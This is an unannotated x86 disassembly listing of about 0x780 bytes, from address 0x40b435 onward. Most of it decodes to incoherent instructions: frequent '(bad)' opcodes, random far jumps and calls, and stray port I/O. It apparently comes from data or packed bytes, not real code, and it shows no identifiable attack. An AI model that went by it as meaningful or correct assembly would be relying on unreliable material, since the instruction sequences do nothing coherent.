  40b435:	fst    DWORD PTR [esi+0x29]
  40b438:	xchg   edx,eax
  40b439:	xchg   edx,eax
  40b43a:	(bad)  
  40b43c:	xor    BYTE PTR [eax+0x11],ah
  40b43f:	das    
  40b440:	sub    edi,DWORD PTR [ebx-0x64]
  40b443:	loop   0x40b461
  40b445:	in     al,0x26
  40b447:	or     al,0xd7
  40b449:	hlt    
  40b44a:	clc    
  40b44b:	ja     0x40b482
  40b44d:	int3   
  40b44e:	imul   esp,DWORD PTR [ecx],0xfffffff6
  40b451:	xchg   edx,eax
  40b452:	(bad)  [edi+0x3426db88]
  40b459:	int3   
  40b45a:	xor    al,dl
  40b45c:	mov    bh,0xb0
  40b45e:	jmp    0xeae6eb56
  40b463:	inc    ebx
  40b464:	adc    eax,0x5c537e82
  40b469:	sub    edx,DWORD PTR [eax+0x4c536c9e]
  40b46f:	psllw  mm2,mm4
  40b472:	aad    0xb3
  40b474:	mov    cl,0x2f
  40b476:	jne    0x40b489
  40b478:	and    BYTE PTR [edx+0x2f49cdd],0x4
  40b47f:	and    ecx,edx
  40b481:	clc    
  40b482:	mov    WORD PTR [ebp+0x34],?
  40b485:	stc    
  40b486:	xchg   edi,eax
  40b487:	or     BYTE PTR ds:0x15c98ff7,al
  40b48d:	test   DWORD PTR [esi-0x3730db5a],esp
  40b493:	mov    ?,WORD PTR ds:0xcdf71ef6
  40b499:	and    ecx,esp
  40b49b:	(bad)  
  40b49c:	mov    ch,0x53
  40b49e:	pop    ds
  40b49f:	(bad)  
  40b4a0:	in     eax,dx
  40b4a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4a2:	out    0xc1,al
  40b4a4:	inc    edx
  40b4a5:	(bad)  
  40b4a6:	std    
  40b4a7:	xchg   DWORD PTR [edx+0x2a39312],ecx
  40b4ad:	les    cx,DWORD PTR [edi+ecx*4+0x49e49b27]
  40b4b5:	dec    ebx
  40b4b6:	xchg   ebp,eax
  40b4b7:	(bad)  
  40b4b9:	jmp    0xbc28b168
  40b4be:	xor    al,0xad
  40b4c0:	stos   DWORD PTR es:[edi],eax
  40b4c1:	dec    edx
  40b4c2:	push   ss
  40b4c3:	and    al,0x64
  40b4c5:	repnz pop edx
  40b4c7:	lea    ebx,[edi]
  40b4c9:	sbb    BYTE PTR [esi+0x74],al
  40b4cc:	(bad)  
  40b4cd:	leavew 
  40b4cf:	sub    BYTE PTR [esi],0xf8
  40b4d2:	outs   dx,BYTE PTR ds:[esi]
  40b4d3:	pop    DWORD PTR [ebp+0x1a]
  40b4d6:	pop    esp
  40b4d7:	push   esi
  40b4d8:	fcom   DWORD PTR ds:0x8a0f3daf
  40b4de:	xor    dh,0x38
  40b4e1:	xchg   DWORD PTR [edi+0x24378a8e],eax
  40b4e7:	adc    ecx,DWORD PTR [ecx+0x45b99299]
  40b4ed:	sbb    dh,0xce
  40b4f0:	xchg   BYTE PTR [esi],ch
  40b4f2:	xor    al,0x63
  40b4f4:	leave  
  40b4f5:	add    bh,BYTE PTR [esi+0x373e4cfa]
  40b4fb:	inc    esi
  40b4fc:	js     0x40b54e
  40b4fe:	and    edi,ebp
  40b500:	ss or  eax,0xeb4f716e
  40b506:	shl    DWORD PTR [edx+0x449fa2f9],cl
  40b50c:	sub    DWORD PTR [ecx-0x3815a2cc],ebp
  40b512:	aaa    
  40b513:	fwait
  40b514:	or     ecx,ebp
  40b516:	push   cs
  40b517:	enter  0x2218,0xa
  40b51b:	pop    edi
  40b51c:	sahf   
  40b51d:	into   
  40b51e:	jne    0x40b512
  40b520:	mov    ch,0x3a
  40b522:	xchg   esi,eax
  40b523:	int    0x7b
  40b525:	mov    al,ds:0xd42ce894
  40b52a:	pop    edi
  40b52b:	fsub   QWORD PTR [eax-0x7]
  40b52e:	cmc    
  40b52f:	xchg   ebp,eax
  40b530:	js     0x40b58b
  40b532:	sub    al,0x18
  40b534:	mov    dh,BYTE PTR [eax-0x51]
  40b537:	dec    ebp
  40b538:	das    
  40b539:	mov    ecx,0xfffa9b0b
  40b53e:	loope  0x40b526
  40b540:	xor    BYTE PTR [ecx+ebp*2-0x6],dl
  40b544:	pop    ebp
  40b545:	out    dx,eax
  40b546:	lahf   
  40b547:	jbe    0x40b562
  40b549:	cwde   
  40b54a:	sbb    al,0xce
  40b54c:	or     BYTE PTR [ebx-0x54838199],bh
  40b552:	ds je  0x40b5bd
  40b555:	rdmsr  
  40b557:	xor    bl,BYTE PTR [eax+0x35]
  40b55a:	aaa    
  40b55b:	std    
  40b55c:	pop    esp
  40b55d:	jmp    0x40b550
  40b55f:	daa    
  40b560:	xor    edi,DWORD PTR [edx+0x72]
  40b563:	xor    ebp,ebx
  40b565:	jmp    0xde3e:0xa3682d12
  40b56c:	mov    al,ds:0x4ac492cc
  40b571:	pop    ebx
  40b572:	jmp    0x143fad5
  40b577:	mov    esp,0x9ecff71c
  40b57c:	mov    BYTE PTR [ecx+0x79d25b2a],ah
  40b582:	mov    al,0x22
  40b584:	inc    eax
  40b585:	fidiv  WORD PTR [ecx+0x20]
  40b588:	xlat   BYTE PTR ds:[ebx]
  40b589:	repnz fwait
  40b58b:	jg     0x40b519
  40b58d:	add    bx,WORD PTR [ecx+0x2]
  40b591:	je     0x40b5d8
  40b593:	test   DWORD PTR [edi],esp
  40b595:	pop    esi
  40b596:	fist   DWORD PTR [esi+0x5c]
  40b599:	ja     0x40b551
  40b59b:	xchg   esi,eax
  40b59c:	push   es
  40b59d:	mov    edx,0xfae6fc3b
  40b5a2:	and    BYTE PTR [edx+0x1a],ah
  40b5a5:	lea    ebx,[ecx]
  40b5a7:	fcomp  QWORD PTR [esi+0x73]
  40b5aa:	pop    edi
  40b5ab:	push   esp
  40b5ac:	xchg   esi,eax
  40b5ad:	stc    
  40b5ae:	ins    DWORD PTR es:[edi],dx
  40b5af:	sub    eax,0xb587745b
  40b5b4:	sbb    esi,DWORD PTR [ebx+0x69]
  40b5b7:	cli    
  40b5b8:	in     eax,0xd6
  40b5ba:	outs   dx,DWORD PTR ds:[esi]
  40b5bb:	(bad)  
  40b5bd:	repnz mov ch,0xbe
  40b5c0:	mov    dl,0x43
  40b5c2:	(bad)  
  40b5c3:	mov    al,ds:0xf7411237
  40b5c8:	sub    bh,BYTE PTR [ecx+0x46f84274]
  40b5ce:	(bad)  
  40b5cf:	inc    ebx
  40b5d0:	rol    DWORD PTR [edi+0x4b68926c],1
  40b5d6:	idiv   BYTE PTR [ecx]
  40b5d8:	loope  0x40b5fe
  40b5da:	psraw  mm3,mm2
  40b5dd:	shr    BYTE PTR [edx+0x0],1
  40b5e0:	mov    ds:0xbf0c5cb2,al
  40b5e5:	xor    BYTE PTR [edx-0x4d],bh
  40b5e8:	push   gs
  40b5ea:	jnp    0x40b610
  40b5ec:	inc    eax
  40b5ed:	pop    esi
  40b5ee:	repnz mov eax,ds:0x4a77dbce
  40b5f4:	lds    esi,FWORD PTR [esi+0x7002dfee]
  40b5fa:	pushf  
  40b5fb:	clc    
  40b5fc:	push   eax
  40b5fd:	dec    ecx
  40b5fe:	enter  0xb418,0xc
  40b602:	sbb    ah,BYTE PTR [edx+ecx*8-0x22]
  40b606:	sub    DWORD PTR [edi+0x3a76c91f],edi
  40b60c:	test   eax,0xb07871d5
  40b611:	stos   DWORD PTR es:[edi],eax
  40b612:	(bad)  
  40b613:	into   
  40b614:	and    al,0x99
  40b616:	dec    ebx
  40b617:	addr16 inc eax
  40b619:	in     al,0x83
  40b61b:	pop    ecx
  40b61c:	rcr    DWORD PTR [edi],1
  40b61e:	shl    DWORD PTR [eax],0x8e
  40b621:	bound  ecx,QWORD PTR [edi+esi*4]
  40b624:	lea    ebx,[edi+ecx*8+0x71c6041b]
  40b62b:	push   edi
  40b62c:	dec    ecx
  40b62d:	xchg   ebx,eax
  40b62e:	fisub  DWORD PTR [eax+ebp*4+0x15]
  40b632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b633:	and    BYTE PTR [edi-0x6924ebb2],bh
  40b639:	inc    ebp
  40b63a:	lods   al,BYTE PTR ds:[esi]
  40b63b:	jmp    0x23a7:0x93198a5c
  40b642:	sub    ebx,DWORD PTR [edx-0x28]
  40b645:	or     al,0xc4
  40b647:	(bad)  
  40b648:	into   
  40b649:	dec    esi
  40b64a:	add    edx,DWORD PTR ds:0x68e93f30
  40b650:	loopne 0x40b68d
  40b652:	fidiv  DWORD PTR [esi+0x38]
  40b655:	ss cmp eax,0x3f2e3e6
  40b65b:	psrld  mm6,QWORD PTR ds:0x3e4695dc
  40b662:	je     0x40b69f
  40b664:	comiss xmm6,xmm0
  40b667:	dec    BYTE PTR [edi-0x4d14aca]
  40b66d:	add    DWORD PTR ds:0x56931404,0x4a
  40b674:	in     al,0x58
  40b676:	push   edi
  40b677:	jg     0x40b686
  40b679:	shr    ch,1
  40b67b:	push   edi
  40b67c:	jecxz  0x40b68b
  40b67e:	out    dx,al
  40b67f:	mul    al
  40b681:	push   ds
  40b682:	mov    edx,0x5628159
  40b687:	mov    bl,BYTE PTR [ecx]
  40b689:	nop
  40b68a:	jecxz  0x40b6e7
  40b68c:	or     eax,0xff4cd5ab
  40b691:	fldcw  WORD PTR [edx]
  40b693:	xchg   edi,eax
  40b694:	mov    BYTE PTR ds:0xba50d209,dl
  40b69a:	and    BYTE PTR [edx+0xc708a15],ah
  40b6a0:	cmp    al,0x97
  40b6a2:	mov    edx,0x6f9a1926
  40b6a7:	pop    eax
  40b6a8:	xchg   esp,eax
  40b6a9:	(bad)  
  40b6aa:	arpl   WORD PTR [esi+0x29e65e88],bp
  40b6b0:	add    dl,BYTE PTR [ecx-0x47]
  40b6b3:	add    dl,bh
  40b6b5:	mov    ch,0x2e
  40b6b7:	in     al,0xea
  40b6b9:	pop    edx
  40b6ba:	adc    edx,edi
  40b6bc:	dec    edi
  40b6bd:	(bad)  
  40b6be:	aad    0xd
  40b6c0:	aad    0x85
  40b6c2:	dec    ebx
  40b6c3:	call   0xef40b8d6
  40b6c8:	(bad)  
  40b6c9:	mov    bl,0x4a
  40b6cb:	mov    eax,ds:0x6e915e05
  40b6d0:	cwde   
  40b6d1:	mov    ds:0xdd31739b,al
  40b6d6:	(bad)  
  40b6d7:	push   edi
  40b6d8:	sbb    bl,BYTE PTR [ebx]
  40b6da:	stos   BYTE PTR es:[edi],al
  40b6db:	xchg   esp,eax
  40b6dc:	mov    WORD PTR [esi],?
  40b6de:	inc    ecx
  40b6df:	inc    edi
  40b6e0:	in     al,0xb2
  40b6e2:	aas    
  40b6e3:	mov    dl,0xcd
  40b6e5:	loopne 0x40b699
  40b6e7:	iret   
  40b6e8:	sub    BYTE PTR [edx+0x5c],dh
  40b6eb:	mov    edx,0xa07beb65
  40b6f0:	sub    dl,ch
  40b6f2:	test   al,0x46
  40b6f4:	mov    DWORD PTR [ecx],eax
  40b6f6:	jmp    0x40c082
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edi+0x14b2a2e2],ds
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	ss push esi
  40b726:	mov    ?,WORD PTR [edx]
  40b728:	mov    eax,ds:0x83a43e2c
  40b72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b72e:	pop    edx
  40b72f:	aas    
  40b730:	jge    0x40b724
  40b732:	dec    esi
  40b733:	and    ch,bl
  40b735:	rcr    DWORD PTR [edi+0x7f],1
  40b738:	jo     0x40b796
  40b73a:	sbb    ecx,DWORD PTR [eax-0x13]
  40b73d:	dec    eax
  40b73e:	pop    ds
  40b73f:	mov    cl,0x39
  40b741:	int    0xf
  40b743:	lods   al,BYTE PTR ds:[esi]
  40b744:	and    al,0xf4
  40b746:	test   edx,esi
  40b748:	jns    0x40b790
  40b74a:	inc    esi
  40b74b:	mov    dl,0x74
  40b74d:	outs   dx,BYTE PTR ds:[esi]
  40b74e:	cmp    BYTE PTR [edi+0x10658b5b],0x4f
  40b755:	or     DWORD PTR ds:[ebp+0x39c30e5a],eax
  40b75c:	xchg   ebp,eax
  40b75d:	outs   dx,BYTE PTR ds:[esi]
  40b75e:	lods   eax,DWORD PTR ds:[esi]
  40b75f:	push   ecx
  40b760:	in     al,dx
  40b761:	test   ah,cl
  40b763:	cwde   
  40b764:	loop   0x40b799
  40b766:	push   es
  40b767:	out    dx,al
  40b768:	scas   al,BYTE PTR es:[edi]
  40b769:	(bad)  [edx+0x1c]
  40b76c:	sahf   
  40b76d:	mov    al,ds:0x484ab276
  40b772:	int3   
  40b773:	popa   
  40b774:	loop   0x40b742
  40b776:	xlat   BYTE PTR ds:[ebx]
  40b777:	ins    DWORD PTR es:[edi],dx
  40b778:	jg     0x40b76d
  40b77a:	inc    esi
  40b77b:	adc    DWORD PTR [ebp-0x78],0xbd74a864
  40b782:	inc    edi
  40b783:	out    dx,eax
  40b784:	push   ebp
  40b785:	push   esp
  40b786:	add    al,0x39
  40b788:	and    al,BYTE PTR [eax+0x63f8a505]
  40b78e:	mov    eax,ds:0xdf726c36
  40b793:	cmp    bl,BYTE PTR [edi-0x6e5758df]
  40b799:	cld    
  40b79a:	ins    BYTE PTR es:[edi],dx
  40b79b:	inc    esi
  40b79c:	and    ah,BYTE PTR [ecx-0x44d325b3]
  40b7a2:	inc    esi
  40b7a3:	loop   0x40b73d
  40b7a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a7:	pop    ebx
  40b7a8:	mov    ebp,0x692a5df6
  40b7ad:	pop    eax
  40b7ae:	(bad)  
  40b7af:	pop    edx
  40b7b0:	xchg   ecx,eax
  40b7b1:	pop    esp
  40b7b2:	ret    
  40b7b3:	mov    al,ds:0x44d991df
  40b7b8:	push   ds
  40b7b9:	xchg   ebx,eax
  40b7ba:	pop    ss
  40b7bb:	sbb    eax,0x97113c24
  40b7c0:	call   0xc2af8f9a
  40b7c5:	mov    al,0x3e
  40b7c7:	lods   al,BYTE PTR ds:[esi]
  40b7c8:	rcr    cl,1
  40b7ca:	imul   eax,DWORD PTR [ebx+0x1fbb17a9],0xffffffec
  40b7d1:	sub    ah,0x7f
  40b7d4:	push   ebp
  40b7d5:	mov    WORD PTR [ebx+0xa],cs
  40b7d8:	pop    edi
  40b7d9:	xor    BYTE PTR [edi+0x6c480571],cl
  40b7df:	(bad)  
  40b7e0:	std    
  40b7e1:	inc    esi
  40b7e2:	or     eax,0x52ca3fd6
  40b7e7:	vsubss xmm5,xmm3,DWORD PTR ds:0x5a9dcace
  40b7ef:	mov    ah,0x77
  40b7f1:	sub    al,0xb0
  40b7f3:	test   eax,0x53a13335
  40b7f8:	push   ds
  40b7f9:	adc    DWORD PTR [edi],ecx
  40b7fb:	stos   DWORD PTR es:[edi],eax
  40b7fc:	sub    DWORD PTR [edi],eax
  40b7fe:	sbb    al,0xcb
  40b800:	mov    esp,0x204519fc
  40b805:	pop    ecx
  40b806:	sbb    al,BYTE PTR [edi+edx*8+0x4f47947e]
  40b80d:	aaa    
  40b80e:	gs dec eax
  40b810:	mov    cl,0xfd
  40b812:	push   es
  40b813:	cdq    
  40b814:	push   ss
  40b815:	shr    DWORD PTR [edx-0x4dca810f],1
  40b81b:	ror    BYTE PTR [ebx+0x41],0xee
  40b81f:	jl     0x40b7f3
  40b821:	mov    esp,0xf3f2e9a0
  40b826:	pop    edx
  40b827:	call   0xb62a:0x86c639f4
  40b82e:	ror    dl,cl
  40b830:	xchg   ecx,eax
  40b831:	pop    ecx
  40b832:	pop    es
  40b833:	popf   
  40b834:	lock gs in al,0x23
  40b838:	loop   0x40b86e
  40b83a:	outs   dx,DWORD PTR ds:[esi]
  40b83b:	or     eax,0x70d6c2eb
  40b840:	aad    0x1b
  40b842:	call   FWORD PTR [edx]
  40b844:	or     dh,BYTE PTR [edx]
  40b846:	leave  
  40b847:	pushf  
  40b848:	or     DWORD PTR ds:0x127d713e,edi
  40b84e:	xor    DWORD PTR [ebp-0x1e239d90],0x6a
  40b855:	mov    esp,0x937431ee
  40b85a:	retf   0xd6bd
  40b85d:	mov    ds:0xc18b7b49,al
  40b862:	add    ah,dl
  40b864:	into   
  40b865:	fwait
  40b866:	mov    edx,0x134a0c5c
  40b86b:	imul   esp,DWORD PTR cs:[ecx-0x36b7a619],0xda7318fb
  40b876:	push   eax
  40b877:	mov    gs,WORD PTR [edx+0xe4f213]
  40b87d:	sbb    edi,DWORD PTR ds:0x14c4f6dc
  40b883:	pop    ebx
  40b884:	movntq QWORD PTR [esi],mm0
  40b887:	in     al,0xc4
  40b889:	popa   
  40b88a:	dec    ebp
  40b88b:	rcr    DWORD PTR ds:0x46caeade,1
  40b891:	xor    al,0xb2
  40b893:	mov    al,ds:0xdf803ffb
  40b898:	mov    ebx,0xee84df64
  40b89d:	mov    esi,ds
  40b89f:	fsub   DWORD PTR [esp+esi*8-0x562c9b3e]
  40b8a6:	ins    DWORD PTR es:[edi],dx
  40b8a7:	add    ah,BYTE PTR [esi+edx*1+0x63]
  40b8ab:	enter  0x3383,0xf4
  40b8af:	das    
  40b8b0:	dec    esi
  40b8b1:	test   DWORD PTR [ebx-0x1b9fb7e0],esp
  40b8b7:	sbb    dl,BYTE PTR [ebp-0x45]
  40b8ba:	fistp  WORD PTR [ecx]
  40b8bc:	mov    ah,0xe8
  40b8be:	xchg   BYTE PTR [edi-0x8],ch
  40b8c1:	les    edi,FWORD PTR [edx+0x7a5ca411]
  40b8c7:	xor    al,0xe7
  40b8c9:	mov    ch,0xd1
  40b8cb:	xchg   DWORD PTR [edi+0x7],eax
  40b8ce:	mov    WORD PTR [esi-0x45f01f5f],ss
  40b8d4:	mov    esp,0x7a447a60
  40b8d9:	mov    ah,BYTE PTR [edx]
  40b8db:	loopne 0x40b903
  40b8dd:	adc    edi,DWORD PTR [eax]
  40b8df:	xchg   esp,eax
  40b8e0:	jbe    0x40b8ee
  40b8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e3:	push   ebp
  40b8e4:	pop    ebx
  40b8e5:	pushf  
  40b8e6:	xor    ebp,DWORD PTR [ebp-0x75]
  40b8e9:	out    0xd,al
  40b8eb:	mov    dh,0x25
  40b8ed:	adc    ecx,esp
  40b8ef:	xor    BYTE PTR [esi],dl
  40b8f1:	xchg   BYTE PTR [edx-0x41aefa60],al
  40b8f7:	scas   al,BYTE PTR es:[edi]
  40b8f8:	dec    ecx
  40b8f9:	xor    edi,edx
  40b8fb:	add    ebx,edi
  40b8fd:	adc    al,BYTE PTR [edi]
  40b8ff:	mov    bh,0x9f
  40b901:	xchg   edi,eax
  40b902:	mov    ch,0x3c
  40b904:	sbb    DWORD PTR [esi+0x692f837],ecx
  40b90a:	xor    BYTE PTR [ebp+0xfc1ccdc],0x4d
  40b911:	inc    ebp
  40b912:	gs clc 
  40b914:	add    edi,esi
  40b916:	jl     0x40b8dc
  40b918:	pop    edx
  40b919:	jmp    0xd14858a4
  40b91e:	xchg   edi,eax
  40b91f:	mov    DWORD PTR [edx-0x4a02c8ea],ecx
  40b925:	(bad)  
  40b926:	sub    DWORD PTR [edi-0x2d],esi
  40b929:	ret    0xfe34
  40b92c:	hlt    
  40b92d:	pop    esp
  40b92e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b92f:	push   0x369d1968
  40b934:	sti    
  40b935:	sbb    al,0x36
  40b937:	xor    ch,BYTE PTR [eax+0x10]
  40b93a:	(bad)  
  40b93b:	dec    ebp
  40b93c:	ins    DWORD PTR es:[edi],dx
  40b93d:	into   
  40b93e:	pop    eax
  40b93f:	popa   
  40b940:	in     eax,dx
  40b941:	pop    ds
  40b942:	mov    ds,WORD PTR [edi-0x6042a633]
  40b948:	out    dx,al
  40b949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b94a:	xchg   dh,ch
  40b94c:	xor    dh,BYTE PTR [ebp-0x541246e6]
  40b952:	fstp   QWORD PTR [ecx+0x3b]
  40b955:	not    dh
  40b957:	mov    al,0x6c
  40b959:	xor    BYTE PTR [edi],0x83
  40b95c:	les    esi,FWORD PTR [esi-0x2b9b2f8a]
  40b962:	mov    edi,0x9ca5390f
  40b967:	scas   al,BYTE PTR es:[edi]
  40b968:	imul   esp,DWORD PTR [esi],0xffffffaf
  40b96b:	cdq    
  40b96c:	mov    edi,0x43c5de9e
  40b971:	into   
  40b972:	cmc    
  40b973:	loopne 0x40b923
  40b975:	repnz xchg edi,eax
  40b977:	and    eax,0x1d4adad8
  40b97c:	pop    edx
  40b97d:	mov    bl,0x73
  40b97f:	sub    DWORD PTR [ecx+0x1b],edi
  40b982:	jbe    0x40b9a2
  40b984:	mov    DWORD PTR ds:0xedecba90,eax
  40b98a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b98b:	leave  
  40b98c:	add    dh,cl
  40b98e:	test   BYTE PTR [edx+0x607f35e5],al
  40b994:	shl    DWORD PTR [eax],cl
  40b996:	cmp    eax,0x15c0e21f
  40b99b:	or     BYTE PTR [ebx-0x30],dh
  40b99e:	add    al,0x91
  40b9a0:	sub    eax,0xfb3fa370
  40b9a5:	in     al,dx
  40b9a6:	sahf   
  40b9a7:	jnp    0x40b959
  40b9a9:	pop    bx
  40b9ab:	mov    ebp,0x5eb614a8
  40b9b0:	into   
  40b9b1:	dec    ebp
  40b9b2:	in     eax,0xe3
  40b9b4:	fimul  WORD PTR [edi+0x2307bc45]
  40b9ba:	xor    BYTE PTR fs:[esi],dl
  40b9bd:	fild   QWORD PTR [ecx-0x17]
  40b9c0:	sti    
  40b9c1:	mov    dh,0x3a
  40b9c3:	xor    al,0x6f
  40b9c5:	pop    edi
  40b9c6:	or     eax,DWORD PTR [ecx]
  40b9c8:	test   al,0x69
  40b9ca:	fs daa 
  40b9cc:	add    al,0x18
  40b9ce:	mov    dh,0x33
  40b9d0:	test   eax,0xe88e85c0
  40b9d5:	jae    0x40b9b4
  40b9d7:	out    dx,al
  40b9d8:	neg    ebp
  40b9da:	cmp    DWORD PTR [esi+0x763584de],0xeaf13fdf
  40b9e4:	pop    ecx
  40b9e5:	xor    esi,DWORD PTR [eax]
  40b9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e9:	push   DWORD PTR [edi]
  40b9eb:	js     0x40b99c
  40b9ed:	hlt    
  40b9ee:	inc    ebp
  40b9ef:	jmp    0x40b9e3
  40b9f1:	xchg   edx,eax
  40b9f2:	cmovb  ebp,DWORD PTR [ebp-0x28bb72f]
  40b9f9:	xchg   DWORD PTR [ecx-0x14bc3458],edi
  40b9ff:	sub    DWORD PTR [esp+ebx*2+0x5031630f],esp
  40ba06:	jo     0x40b9de
  40ba08:	(bad)  
  40ba09:	cli    
  40ba0a:	push   ss
  40ba0b:	add    ah,bl
  40ba0d:	stos   DWORD PTR es:[edi],eax
  40ba0e:	and    DWORD PTR [ebp+0x351fa341],edi
  40ba14:	and    edi,DWORD PTR [edi+esi*2+0x4695fa62]
  40ba1b:	mov    edi,0xbf595f8e
  40ba20:	jle    0x40b9d0
  40ba22:	jns    0x40b9c4
  40ba24:	sub    DWORD PTR [eax+0x458b3e6b],ecx
  40ba2a:	clc    
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    dh,BYTE PTR [ebx]
  40ba40:	push   0x23
  40ba42:	movups xmm0,XMMWORD PTR [edi+0x7d7a7e7e]
  40ba49:	jle    0x40bac9
  40ba4b:	nop
  40ba4c:	nop
  40ba4d:	mov    bl,0x3a
  40ba4f:	sub    BYTE PTR [ecx+0xd],cl
  40ba52:	cmp    eax,0x233fa0be
  40ba57:	cmp    al,0xa3
  40ba59:	rcl    DWORD PTR [esi-0x12],cl
  40ba5c:	sub    bl,dl
  40ba5e:	mov    eax,ecx
  40ba60:	mov    ah,0x70
  40ba62:	push   DWORD PTR [ebx+0x7820f364]
  40ba68:	jo     0x40ba16
  40ba6a:	iret   
  40ba6b:	cmp    eax,0xb0f0f693
  40ba70:	lea    ebp,[edi-0x5d]
  40ba73:	out    dx,eax
  40ba74:	shr    DWORD PTR [edi-0x5b7a83ca],cl
  40ba7a:	in     al,0xfc
  40ba7c:	and    eax,0x22580eb9
  40ba81:	out    dx,al
  40ba82:	cmp    edx,DWORD PTR [ecx-0x32]
  40ba85:	lods   al,BYTE PTR ds:[esi]
  40ba86:	adc    DWORD PTR [eax],esp
  40ba88:	imul   ecx,edx,0x9ed25736
  40ba8e:	mov    esp,edx
  40ba90:	and    eax,DWORD PTR [ecx+0xd]
  40ba93:	and    dl,ch
  40ba95:	inc    esi
  40ba96:	push   0xdd235eec
  40ba9b:	and    ah,al
  40ba9d:	or     BYTE PTR [edi+esi*4],cl
  40baa0:	gs jns 0x40ba2f
  40baa3:	pop    edx
  40baa4:	mov    ds:0x3f09df36,al
  40baa9:	pop    ds
  40baaa:	and    eax,0x4dceeb63
  40baaf:	leave  
  40bab0:	or     eax,0x9ee2b910
  40bab5:	cmp    eax,0xde2b5477
  40baba:	pop    edx
  40babb:	jg     0x40bb12
  40babd:	sub    DWORD PTR [edx+0x813e1af],0xb9db71af
  40bac7:	inc    esi
  40bac8:	pushf  
  40bac9:	(bad)  
  40bacb:	xchg   ebp,eax
  40bacc:	inc    esp
  40bacd:	int3   
  40bace:	test   eax,0xc08c8628
  40bad3:	push   ebp
  40bad4:	rcl    ah,cl
  40bad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad7:	fnsave [ebx]
  40bad9:	inc    esi
  40bada:	aad    0x1
  40badc:	ds call 0xe45c69a8
  40bae2:	jo     0x40ba89
  40bae4:	cwde   
  40bae5:	dec    esi
  40bae6:	aaa    
  40bae7:	out    dx,al
  40bae8:	xchg   edi,eax
  40bae9:	sub    BYTE PTR [edi-0x7ac601db],bl
  40baef:	fsub   QWORD PTR [edi]
  40baf1:	sbb    eax,0x25e23fb2
  40baf6:	push   edx
  40baf7:	cmp    al,0xdc
  40baf9:	(bad)  
  40bafa:	aam    0x40
  40bafc:	push   ecx
  40bafd:	lock mov cl,0xbe
  40bb00:	push   ebp
  40bb01:	jecxz  0x40bb3f
  40bb03:	pop    ebx
  40bb04:	dec    ebp
  40bb05:	jl     0x40baf1
  40bb07:	das    
  40bb08:	cmp    al,0xb
  40bb0a:	push   0xdee9c887
  40bb0f:	call   0x3285:0xa934431e
  40bb16:	mov    DWORD PTR [esi-0x4],ecx
  40bb19:	frstor [edx]
  40bb1b:	jl     0x40bb6e
  40bb1d:	mov    dh,0xc8
  40bb1f:	popf   
  40bb20:	pop    esi
  40bb21:	pusha  
  40bb22:	sub    ah,BYTE PTR [ebp+0x26]
  40bb25:	push   esi
  40bb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb27:	adc    cl,BYTE PTR [eax+0x54c592a8]
  40bb2d:	call   0x19c:0xae36be7e
  40bb34:	scas   eax,DWORD PTR es:[edi]
  40bb35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb36:	aaa    
  40bb37:	(bad)  [esp+eax*1-0x41c43855]
  40bb3e:	mov    ah,0xbc
  40bb40:	jmp    FWORD PTR [edx+esi*2+0x11]
  40bb44:	xchg   ecx,eax
  40bb45:	js     0x40bb6a
  40bb47:	jbe    0x40baed
  40bb49:	cs sahf 
  40bb4b:	es dec ebx
  40bb4d:	lods   al,BYTE PTR ds:[esi]
  40bb4e:	and    DWORD PTR [edx+0x34],ebp
  40bb51:	mov    edx,es
  40bb53:	mov    DWORD PTR [ecx+ebx*8+0x1e27358f],ebp
  40bb5a:	inc    edx
  40bb5b:	stos   DWORD PTR es:[edi],eax
  40bb5c:	(bad)  
  40bb5d:	jnp    0x40bb8f
  40bb5f:	cmp    edi,DWORD PTR [ebp+edi*2-0x79]
  40bb63:	push   cs
  40bb64:	aaa    
  40bb65:	aas    
  40bb66:	fs pusha 
  40bb68:	dec    esi
  40bb69:	and    bl,BYTE PTR [edx+0x12]
  40bb6c:	popf   
  40bb6d:	add    eax,0xa65a6db0
  40bb72:	js     0xf1f8f969
  40bb78:	mov    bh,bl
  40bb7a:	out    0x1d,eax
  40bb7c:	icebp  
  40bb7d:	(bad)  
  40bb7f:	sub    ebx,DWORD PTR [edi+esi*4+0x20]
  40bb83:	int3   
  40bb84:	ret    0xf39d
  40bb87:	ins    DWORD PTR es:[edi],dx
  40bb88:	adc    DWORD PTR [esi-0x3bd974d5],eax
  40bb8e:	xchg   ecx,eax
  40bb8f:	dec    ebx
  40bb90:	cld    
  40bb91:	xor    eax,0xbb88d718
  40bb96:	test   al,0xeb
  40bb98:	add    BYTE PTR [eax+0x40fcab43],cl
  40bb9e:	cmp    eax,esp
  40bba0:	in     al,0x8d
  40bba2:	sub    ah,bh
  40bba4:	fwait
  40bba5:	pop    ebx
  40bba6:	out    0x74,al
  40bba8:	iret   
  40bba9:	test   dl,ch
  40bbab:	add    al,0x5e
  40bbad:	addr16 call 0x64d0:0x191c551b
